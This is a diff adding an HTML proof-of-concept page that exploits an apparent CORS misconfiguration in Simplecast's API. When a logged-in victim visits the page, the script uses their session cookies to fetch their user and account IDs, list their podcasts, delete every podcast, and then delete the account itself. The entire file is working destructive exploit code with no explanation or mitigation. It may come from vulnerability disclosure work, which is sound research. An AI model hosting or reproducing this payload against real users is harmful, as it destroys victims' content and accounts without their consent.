@@ -1,0 +1,65 @@
+<html>
+
+<head>
+    <title>Simplecast CORS Account Deletion PoC</title>
+</head>
+
+<body>
+    <h2>🧨 Exploit in Progress...</h2>
+    <pre id="log">Initializing...</pre>
+    <script>
+        const log = document.getElementById("log");
+        const headers = {
+            "X-Simplecast-App": "dashboard"
+        };
+        // Step 1: Get current user info
+        fetch("https://cms-api-gateway.simplecast.com/current_user?default_podcast=true", {
+                credentials: "include",
+                headers
+            })
+            .then(res => res.json())
+            .then(user => {
+                const userId = user.id;
+                const accountId = user.accounts.default.id;
+                log.textContent = `✅ User Info:\nUser ID: ${userId}\nAccount ID: ${accountId}\n\n📡 Getting all Podcasts...`;
+                // Step 2: Fetch all podcasts
+                return fetch(`https://cms-api-gateway.simplecast.com/users/${userId}/podcasts?account=${accountId}`, {
+                    credentials: "include",
+                    headers
+                }).then(res => res.json()).then(podcasts => {
+                    const allPodcasts = podcasts.collection.map(p => p.id);
+                    log.textContent += `\n🎙️ Found ${allPodcasts.length} Podcasts:\n` + allPodcasts.join("\n");
+                    // Step 3: Delete all podcasts sequentially
+                    return Promise.all(allPodcasts.map(podcastId =>
+                        fetch(`https://cms-api-gateway.simplecast.com/podcasts/${podcastId}`, {
+                            method: "DELETE",
+                            credentials: "include",
+                            headers
+                        }).then(res => {
+                            if (!res.ok) throw new Error(`❌ Failed to delete podcast: ${podcastId}`);
+                            log.textContent += `\n🗑️ Deleted podcast: ${podcastId}`;
+                        })
+                    )).then(() => {
+                        log.textContent += "\n\n✅ All podcasts deleted.\n\n🚨 Deleting account...";
+                        // Step 4: Delete account
+                        return fetch(`https://cms-api-gateway.simplecast.com/users/${userId}`, {
+                            method: "DELETE",
+                            credentials: "include",
+                            headers
+                        });
+                    }).then(res => {
+                        if (res.ok) {
+                            log.textContent += "\n✅ Account deleted successfully!";
+                        } else {
+                            throw new Error("❌ Account deletion failed");
+                        }
+                    });
+                });
+            })
+            .catch(err => {
+                log.textContent += "\n\n⚠️ Error: " + err;
+            });
+    </script>
+</body>
+
+</html>`
